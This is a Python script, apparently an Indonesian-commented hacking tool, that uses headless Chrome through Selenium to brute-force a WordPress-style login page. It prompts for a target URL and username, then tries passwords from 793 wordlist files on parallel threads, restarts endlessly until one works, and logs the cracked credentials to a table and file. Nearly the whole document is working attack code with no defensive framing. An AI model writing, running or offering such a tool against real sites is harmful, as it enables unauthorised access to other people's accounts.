import os
import time
import logging
from tabulate import tabulate
from termcolor import colored
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import StaleElementReferenceException, NoSuchElementException, WebDriverException
from concurrent.futures import ThreadPoolExecutor, as_completed

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

def read_wordlist(wordlist_file):
    with open(wordlist_file, 'r') as file:
        wordlist = file.read().splitlines()
    return wordlist

def brute_force(url, username, wordlists):
    results = []
    total_combinations = sum(len(read_wordlist(file)) for file in wordlists)
    combinations_tried = 0
    password_found = False

    with ThreadPoolExecutor() as executor:
        futures = []
        for wordlist_file in wordlists:
            wordlist = read_wordlist(wordlist_file)
            futures.append(executor.submit(check_login, url, username, wordlist))

        for future in as_completed(futures):
            try:
                success, password = future.result()
            except Exception as e:
                logger.error(f"Error occurred during login check: {e}")
                continue
            
            combinations_tried += len(wordlist)
            progress = combinations_tried / total_combinations * 100
            logger.info(f"Loading: {progress:.2f}% Complete")

            if success:
                results.append((username, password, "Success"))
                password_found = True
                break

    return results, password_found

def check_login(url, username, wordlist):
    # Setup Selenium
    service = Service('path/to/chromedriver')  # Ganti dengan path ke chromedriver
    options = Options()
    options.add_argument('--headless')  # Menjalankan Chrome di mode headless
    driver = webdriver.Chrome(service=service, options=options)

    try:
        # Navigasi ke halaman login
        driver.get(url)

        try:
            # Cari elemen input username dan tombol submit
            input_username = driver.find_element(By.ID, "user_login")  # Ganti dengan nama elemen input username pada halaman login
        except NoSuchElementException:
            # If the element is not found by ID, try using other locators
            try:
                input_username = driver.find_element(By.NAME, "username")  # Example: using the name attribute
            except NoSuchElementException:
                # If still not found, try using CSS selector
                try:
                    input_username = driver.find_element(By.CSS_SELECTOR, "input[name='username']")
                except NoSuchElementException:
                    logger.error("Login elements not found. Check the login page structure.")
                    raise

        submit_button = driver.find_element(By.ID, "wp-submit")  # Ganti dengan nama elemen tombol submit pada halaman login

        for password in wordlist:
            try:
                input_password = driver.find_element(By.ID, "user_pass")  # Ganti dengan nama elemen input password pada halaman login
                input_password.clear()
                input_password.send_keys(password)
                submit_button.click()

                # Lakukan pengecekan apakah login berhasil
                # Contoh sederhana menggunakan URL setelah login
                if driver.current_url == "https://example.com/dashboard":  # Ganti dengan URL yang menunjukkan login berhasil
                    return True, password
            except StaleElementReferenceException:
                # Jika terjadi StaleElementReferenceException, cari ulang elemen yang dibutuhkan
                continue
            except WebDriverException as e:
                logger.error(f"Error occurred during login attempt: {e}")
                raise e
    finally:
        driver.quit()

    return False, None

if __name__ == "__main__":
    # ASCII Art Header with 7 different colors
    banner = """
    ██████   ██████ ███████████    █████ ██████   █████ ██████████      ███████    ██████   ██████ ███████████  
    ░░██████ ██████ ░█░░░███░░░█   ░░███ ░░██████ ░░███ ░░███░░░░███   ███░░░░░███ ░░██████ ██████ ░░███░░░░░███ 
     ░███░█████░███ ░   ░███  ░     ░███  ░███░███ ░███  ░███   ░░███ ███     ░░███ ░███░█████░███  ░███    ░███ 
     ░███░░███ ░███     ░███        ░███  ░███░░███░███  ░███    ░███░███      ░███ ░███░░███ ░███  ░██████████  
     ░███ ░░░  ░███     ░███        ░███  ░███ ░░██████  ░███    ░███░███      ░███ ░███ ░░░  ░███  ░███░░░░░███ 
     ░███      ░███     ░███        ░███  ░███  ░░█████  ░███    ███ ░░███     ███  ░███      ░███  ░███    ░███ 
     █████     █████    █████    ██ █████ █████  ░░█████ ██████████   ░░░███████░   █████     █████ █████   █████
    ░░░░░     ░░░░░    ░░░░░    ░░ ░░░░░ ░░░░░    ░░░░░ ░░░░░░░░░░      ░░░░░░░    ░░░░░     ░░░░░ ░░░░░   ░░░░░ 
    """
    colored_banner = colored(banner, "yellow", attrs=["bold", "underline"])
    print(colored_banner)

    # Masukkan URL dan username
    url = input("Masukkan URL: ")
    username = input("Masukkan username: ")

    # Daftar file wordlist yang akan digunakan
    wordlist_files = []
    for i in range(1, 794):
        wordlist_files.append(f"db/wordlist_{i}.txt")

    # Buat log file
    log_filename = "brute_force_log.txt"
    log_file = open(log_filename, "a")

    # Tulis informasi ke log file
    log_file.write(f"URL: {url}\n")
    log_file.write(f"Username: {username}\n\n")
    log_file.write("Brute Force Log:\n")

    # Jalankan fungsi brute_force dengan URL, username, dan file wordlist yang diberikan
    start_time = time.time()
    while True:
        brute_force_results, password_found = brute_force(url, username, wordlist_files)
        if password_found:
            break
        else:
            print("No password found. Restarting brute force...")
            log_file.write("No password found. Restarting brute force...\n")
    end_time = time.time()

    # Tampilkan hasil dalam bentuk tabel
    table_headers = ["Username", "Password", "Status"]
    table_data = brute_force_results
    table = tabulate(table_data, headers=table_headers, tablefmt="fancy_grid")
    print(table)

    # Tampilkan nama wordlist yang digunakan
    print("\nWordlist used:")
    for file in wordlist_files:
        print(file)

    # Tampilkan waktu yang dibutuhkan
    execution_time = end_time - start_time
    print(f"\nExecution time: {execution_time:.2f} seconds")

    # Tulis waktu eksekusi ke log file
    log_file.write(f"\nExecution time: {execution_time:.2f} seconds\n")

    # Tutup log file
    log_file.close()

    # Tampilkan lokasi log file
    print(f"\nLog file saved: {os.path.abspath(log_filename)}")
